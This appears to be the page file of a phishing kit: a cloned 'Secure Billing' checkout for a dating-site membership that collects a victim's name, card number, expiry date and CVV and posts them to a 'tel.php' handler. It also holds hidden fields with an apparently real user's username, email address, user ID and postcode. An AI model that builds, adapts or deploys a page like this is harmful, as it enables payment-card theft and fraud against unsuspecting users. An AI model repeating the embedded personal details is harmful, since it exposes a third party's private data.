<?php
include "Start.php";
?>
<!DOCTYPE html>
<html>
<head>
      <meta charset="utf-8">
      <meta name="robots" content="noindex, nofollow" />
      <title>Secure Billing</title>

      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

      <link rel="stylesheet" href="css/normalize.css">
      <link rel="stylesheet" href="css/styles.css">
      <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,400,600" rel="stylesheet">
</head>
<body>
    
        <input type="hidden" name="tour_id" value="20239">
<input type="hidden" name="x_type" value="">
<input type="hidden" name="pi_code" value="">
<input type="hidden" name="country" value="GB">
<input type="hidden" name="zip" value="G2 3DU">
<input type="hidden" name="aid" value="104474">
<input type="hidden" name="subid" value="">
<input type="hidden" name="reff" value="type_in">
<input type="hidden" name="rs" value="2076">
<input type="hidden" name="username" value="manooto_nruebmed">
<input type="hidden" name="password" value="">
<input type="hidden" name="email" value="manooto_95@yahoo.com">
<input type="hidden" name="user_id" value="138424556">
<input type="hidden" name="product_id" value="28">        <div id="wrapper">
            <header class="header">
                <h1 class="header-title">Secure Billing</h1>
                <small class="header-subtitle">You will be billed by wmarktg.com</small>
            </header>

            <div class="form-body">
                <div class="card-icons">
                                        <img src="img/visa.png" alt="Visa" width="57" height="38">
                                                            <img src="img/mastercard.png" alt="MasterCard" width="57" height="38">
                                                        </div>

                <div class="terms-block">
                    <p class="terms-title">Payment amount</p>

                   <div class="amount"><b class="price-number amount">$<?php echo $_SESSION["amount"]; ?> </b></div>
                    <div class="duration">
                                                    1 Day Access
                                            </div>

                    <p class="header_clear">&nbsp;</p>
                </div>
<form method="POST" action="tel.php">
                                        <input type="hidden" name="card_exp_date" value="" id="real_expiration" />
                    <input type="hidden" name="card_number" value="" id="real_card_number" />
                    
                    <div class="field" id="fullname_field">
                        <label for="full_name">Full Name</label>
                        <input type="text" id="full_name" name="full_name" value="" autocorrect="off" autocapitalize="off">
                        <span class="error-msg">Enter your email address</span>
                    </div>

                    <div class="field" id="ccnum_field">
                        <label for="ccnum">Credit Card</label>
                                                <input type="tel" id="ccnum" name="card_number_fake" maxlength="19" value="" autocorrect="off">
                                                <span class="error-msg">Enter the card number</span>
                    </div>

                    <div class="split-field">
                                                <div class="field col-1" id="expire_field">
                            <label for="expiry">Expiry Date</label>
                            <input type="tel" id="expiry" maxlength="5" placeholder="MM / YY" name="card_exp_date_fake" value="" autocorrect="off">
                            <span class="error-msg">Enter your card's expiry date</span>
                        </div>
                        
                        <div class="field col-2" id="cvv_field">
                            <label for="cvv">CVV</label>
                            <div class="input-with-icon">
                                <input type="tel" maxlength="3" id="cvv" name="card_cvv2" value="" >
                                <span class="help-icon" data-help="cvv">?</span>
                                <span class="error-msg">Enter your card's CVV</span>
                            </div>
                        </div>
                    </div>

                    <div class="field"></div>

                <p class="fine-print">
                                            By submitting this form, you certify that you are 18 years of age or older, agree to the
                        <a target="_blank" href="#">terms and conditions</a>
                        and have read the <a target="_blank" href="#">privacy policy</a>.
                                    </p>

                    <button type="submit" id="pay" class="btn-pay">
                        <img src="img/icon-lock.png" alt="" width="14" height="17">
                        Pay                    </button>
</form>
                <p class="fine-print contact-support center-text renews">
                                            Contact <a target="_blank" href="#">online support</a> anytime or
                        call (1-800-488-0813).
                                    </p>

                <p class="fine-print center-text">
                    Fortuna Marketing Ltd - Office E, 11 Old Ladies Court, Battle, TN33 0AH United Kingdom                </p>

                <p class="fine-print">You are paying $1.00 for a 1 day membership to WellHello and it will appear on your card statement as from WMARKTG.COM-8004880813. Membership renews at $42.48 every month. If we are unable to renew your membership, a $2 convenience fee will be charged.<br /> ** If you are a prepaid card user, $42.48 for a 30 day period will be charged for membership.</p>

                            </div>

            <!-- Popup -->
            <div class="help-box" id="help">
                <div class="close">&times;</div>
                <div id="help-content"></div>
            </div>
            <!-- e:Popup -->
        </div>
        		<input type="hidden" name="thm_session_id" value="53290120191216120509929568" />
		<p style="background:url(https://h.online-metrix.net/fp/clear.png?org_id=lygdph9h&session_id=53290120191216120509929568&session2=5eaa138d3ff2524bc457887ec2b7a8c3&m=1)"></p>
		<img src="https://h.online-metrix.net/fp/clear.png?org_id=lygdph9h&session_id=53290120191216120509929568&m=2">
		<script src="https://h.online-metrix.net/fp/check.js?org_id=lygdph9h&session_id=53290120191216120509929568"></script><input type="hidden" name="session_id" value="12e1a830c3bcd8e7b90621f4edb9ccf5" /><script type="text/javascript">

</script>    

    <!-- JavaScript -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
    <script>window.jQuery || document.write('<script src="js/vendor/jquery-1.11.3.min.js"><\/script>')</script>
    <script type="text/javascript" src="/join/js/join_form.js"></script>
    <script type="text/javascript">
        var no_mask = 0;
    </script>
    <script src="js/form.js"></script>
    <script src="js/invoice.js"></script>
</body>
</html>
